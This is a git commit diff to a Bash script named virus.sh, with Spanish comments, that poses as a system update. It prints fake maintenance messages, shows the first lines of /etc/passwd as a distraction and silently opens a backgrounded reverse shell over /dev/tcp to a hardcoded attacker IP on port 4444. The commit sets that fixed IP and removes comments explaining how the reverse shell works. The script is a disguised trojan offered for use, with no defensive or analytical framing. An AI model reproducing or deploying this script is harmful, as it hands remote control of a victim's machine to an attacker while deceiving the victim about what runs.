9a2a5087d9c33958339794fb3545d6557e92cc11
dortegaamores-crypto <dortegaamores@gmail.com>
2026-03-05 17:56:52 +0100

    Update virus.sh

--- shell.oculta/virus.sh
+++ shell.oculta/virus.sh
@@ -1,19 +1,14 @@
 #!/bin/bash
-# Uso: ./sorpresa.sh <TU_IP>
-IP_ATACANTE=$(hostname -I | awk '{print $1}')
+# AQUÍ ESTÁ EL TRUCO: Pon tu IP de atacante fija
+IP_ATACANTE="192.168.1.109"
 PUERTO=4444
 
 echo "Iniciando mantenimiento del sistema..."
-# EFECTO VISUAL: Escupimos datos para distraer (Capa de in>
 cat /etc/passwd | head -n 5
 echo "Procesando paquetes..."
 
-# LA REVERSE SHELL (El corazón del ataque)
-# -i: Shell interactiva
-# >&: Une salida y errores y los manda al socket TCP
-# 0>&1: Conecta tu teclado con la entrada de la víctima
+# Ejecutamos la reverse shell hacia TU IP (192.168.1.109)
 bash -i >& /dev/tcp/$IP_ATACANTE/$PUERTO 0>&1 &
 
 sleep 2
 echo "Actualización completada."
-
